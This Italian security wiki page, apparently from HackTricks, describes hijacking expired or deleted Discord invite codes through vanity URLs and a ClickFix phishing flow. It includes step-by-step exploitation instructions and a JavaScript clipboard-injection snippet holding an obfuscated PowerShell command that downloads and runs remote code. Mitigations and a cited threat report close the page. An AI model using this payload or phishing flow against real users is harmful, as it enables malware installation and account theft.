# Hijacking degli inviti Discord

Il hijacking degli inviti Discord sfrutta le regole di riutilizzo dei vanity link personalizzati: un codice di invito temporaneo scaduto, oppure un codice permanente eliminato composto solo da lettere minuscole e cifre, può essere registrato come vanity link su un server con Level 3 Boost. Un vanity link personalizzato può diventare disponibile anche quando il server originale perde il proprio Level 3 Boost; per un invito temporaneo con lettere maiuscole, un attacker può pre-registrare la forma vanity in minuscolo mentre l'invito normale rimane attivo, ma il reindirizzamento inizia solo dopo la scadenza dell'invito.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipi di invito e rischio di hijacking

Il rischio osservato varia in base al tipo di invito:<sup>[[1]](#references)[[2]](#references)</sup>

| Tipo di invito           | Hijackabile? | Condizione / Commenti                                                                                       |
|--------------------------|--------------|--------------------------------------------------------------------------------------------------------------|
| Link di invito temporaneo | ✅          | Dopo la scadenza, il codice diventa disponibile e può essere nuovamente registrato come vanity URL da un server boosted. |
| Link di invito permanente | ⚠️          | Se eliminato e composto solo da lettere minuscole e cifre, il codice potrebbe diventare nuovamente disponibile.        |
| Vanity link personalizzato | ✅        | Se il server originale perde il proprio Level 3 Boost, il suo vanity invite diventa disponibile per una nuova registrazione.    |

## Fasi di exploitation

1. Ricognizione
- Monitorare fonti pubbliche (forum, social media, canali Telegram) alla ricerca di invite link corrispondenti al pattern `discord.gg/{code}` o `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Raccogliere i codici di invito di interesse (temporanei o vanity).<sup>[[1]](#references)</sup>
2. Pre-registrazione
- Creare o utilizzare un server Discord esistente con privilegi Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- In **Server Settings → Vanity URL**, tentare di assegnare il codice di invito target. Se accettato, il codice viene riservato dal server malevolo.<sup>[[1]](#references)</sup>
3. Attivazione dell'hijack
- Per gli inviti temporanei, attendere la scadenza dell'invito originale (oppure eliminarlo manualmente se si controlla la fonte).<sup>[[1]](#references)</sup>
- Per i codici contenenti lettere maiuscole, la variante in minuscolo può essere reclamata immediatamente, anche se il reindirizzamento si attiva solo dopo la scadenza.<sup>[[1]](#references)</sup>
4. Reindirizzamento silenzioso
- Gli utenti che visitano il vecchio link vengono inviati senza interruzioni al server controllato dall'attacker una volta attivo l'hijack.<sup>[[1]](#references)</sup>

## Phishing Flow tramite un server Discord

1. Limitare i canali del server in modo che sia visibile solo un canale **#verify**.<sup>[[1]](#references)</sup>
2. Implementare un bot (ad esempio, **Safeguard#0786**) per chiedere ai nuovi arrivati di verificarsi tramite OAuth2.<sup>[[1]](#references)</sup>
3. Il bot reindirizza gli utenti verso un sito di phishing (ad esempio, `captchaguard.me`) con il pretesto di un CAPTCHA o di una procedura di verifica.<sup>[[1]](#references)</sup>
4. Implementare il trucco UX **ClickFix**:<sup>[[1]](#references)</sup>
- Visualizzare un messaggio CAPTCHA non funzionante.
- Guidare gli utenti ad aprire la finestra di dialogo **Win+R**, incollare un comando PowerShell pre-caricato e premere Invio.

### Esempio di Clipboard Injection con ClickFix

La campagna utilizzava JavaScript per copiare un comando PowerShell malevolo negli appunti:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Questo approccio evita i download diretti di file e sfrutta elementi dell'interfaccia utente familiari per ridurre i sospetti degli utenti.<sup>[[1]](#references)</sup>

## Mitigations

- Preferire gli invite link permanenti e assicurarsi che il codice contenga almeno una lettera maiuscola; i codici permanenti eliminati contenenti lettere maiuscole non possono essere riutilizzati come vanity link.<sup>[[1]](#references)</sup>
- Ruotare regolarmente gli invite code e revocare i vecchi link.
- Monitorare lo stato dei boost del server Discord e le richieste di vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Istruire gli utenti a verificare l'autenticità del server ed evitare di eseguire comandi incollati dagli appunti.

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
